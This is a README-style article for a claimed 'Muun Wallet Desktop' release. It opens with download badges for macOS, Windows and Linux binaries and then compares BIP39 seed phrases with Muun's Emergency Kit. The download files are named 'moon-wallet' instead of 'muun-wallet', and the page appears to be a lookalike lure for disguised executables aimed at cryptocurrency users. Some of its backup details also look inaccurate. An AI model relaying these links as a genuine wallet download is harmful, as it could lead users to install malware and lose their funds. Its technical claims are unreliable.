[![Muun Wallet](https://img.shields.io/badge/Muun%20Wallet-Desktop-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE)

[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip)

---

# Muun Wallet Seed Phrase vs Emergency Kit: What Is the Difference?

If you have used other Bitcoin wallets before, you are likely familiar with seed phrases — a list of 12 or 24 words that back up your wallet. Muun Wallet Desktop does not use a seed phrase. It uses an Emergency Kit. This article explains what the Emergency Kit is, why a seed phrase would not work for Muun's architecture, and what the practical differences mean for you.

---

## What a seed phrase is and how it works

A BIP39 seed phrase is a human-readable encoding of a single private key (or more precisely, a root key from which all wallet keys are derived). It was designed for single-key, single-signature wallets. You write down 12 or 24 words, and those words can be entered into any BIP39-compatible wallet to restore your funds. The portability is a genuine advantage — if Electrum or Sparrow disappeared, you could import your seed phrase into any other compatible wallet.

The limitation of a seed phrase is that it encodes exactly one root key. It cannot encode the additional data required by more complex wallet structures — like multisig, where multiple keys are required to authorize a transaction, or like Muun's architecture, which uses output scripts that require both a device key and a swap service key to reconstruct.

---

## Why Muun uses an Emergency Kit instead

Muun Wallet's 2-of-2 multisignature model involves two keys: one generated on your device and one held by Muun's infrastructure. Every transaction requires both. The output scripts that describe how your Bitcoin is locked include references to both keys and to the specific multisig structure used.

A standard seed phrase encodes only one of these two keys. That is not enough to reconstruct a Muun wallet — you would have one key but not the output descriptors needed to find your funds on the blockchain and spend them. The Emergency Kit is designed to include all of this:

- Your **device private key** (or the data needed to derive it)
- The **output descriptors** that describe your wallet's script structure
- The **Muun-held key** material needed for the 2-of-2 reconstruction

Together, these allow the [open-source recovery tool](https://github.com/muun-network/recovery) to sweep your entire balance to any destination address, independently of Muun's servers.

---

## Practical comparison

| Property | BIP39 Seed Phrase | Muun Emergency Kit |
|---|---|---|
| Format | 12 or 24 words | 32-character code + second factor |
| What it encodes | Single root private key | Keys + output descriptors for full recovery |
| Portable to other wallets | Yes — importable into any BIP39 wallet | No — Muun-specific recovery process |
| Required for Muun | No — architecture mismatch | Yes — designed for 2-of-2 multisig |
| Server-independent recovery | Depends on wallet | Yes — recovery tool works offline |
| Storage format | Write down words | Record code + choose second factor (PDF, password, or email) |

---

## Does this mean Muun's backup is less safe?

No — different, not less safe. The Emergency Kit achieves the same core property: you can recover your funds on a new device, independent of Muun's continued operation, as long as you have the kit. The recovery tool is open source and publicly auditable at [muun-network/recovery](https://github.com/muun-network/recovery).

The meaningful difference is portability. A BIP39 seed phrase from Sparrow can be imported into Electrum, BlueWallet, or dozens of other wallets in seconds. The Muun Emergency Kit recovers your funds by sweeping them to a new on-chain address — you choose the destination, which could be any wallet. It is one extra step rather than a direct import, but the end result (access to your Bitcoin) is the same.

---

## What to do with the Emergency Kit

The Emergency Kit should be treated with the same care as a seed phrase: written down or printed, stored offline, kept somewhere physically secure, and separate from your computer. If you lose the Emergency Kit and lose access to your device, your funds are unrecoverable. See the [Emergency Kit recovery guide](muun-wallet-emergency-kit-recovery-guide.md) for the complete setup and storage walkthrough.

---

## Related articles

- [Muun Wallet Emergency Kit recovery guide](muun-wallet-emergency-kit-recovery-guide.md)
- [How to back up your Muun Wallet](how-to-back-up-muun-wallet.md)
- [Is Muun Wallet safe?](is-muun-wallet-safe.md)
- [What is a non-custodial Bitcoin wallet?](what-is-a-non-custodial-bitcoin-wallet.md)
- [Muun Wallet getting started guide](muun-wallet-getting-started-guide.md)
